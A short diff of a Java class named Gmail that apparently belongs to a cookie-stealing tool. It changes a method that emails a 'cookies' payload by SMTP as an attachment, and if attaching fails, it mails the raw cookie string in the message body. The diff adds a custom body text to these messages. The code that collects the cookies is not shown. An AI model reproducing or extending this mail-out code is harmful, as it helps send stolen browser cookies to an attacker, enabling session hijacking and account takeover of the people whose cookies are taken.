@@ -65,7 +65,7 @@ public class Gmail {
 	
 	}
 	
-	public static void sendAttached(String cookies){
+	public static void sendAttached(String body, String cookies){
 
       Properties props = new Properties();
 		props.put("mail.smtp.auth", "true");
@@ -99,7 +99,7 @@ public class Gmail {
          BodyPart messageBodyPart = new MimeBodyPart();
 
          // Now set the actual message
-         messageBodyPart.setText("Cookie File Attached");
+         messageBodyPart.setText(body);
 
          // Create a multipar message
          Multipart multipart = new MimeMultipart();
@@ -118,7 +118,7 @@ public class Gmail {
 		}
 		
 		if(source == null){
-			send("Failed to attache file.\n\n"+cookies);
+			send("Failed to attache file.\n\n"+body+"===================\n"+cookies);
 			return;
 		}
 		
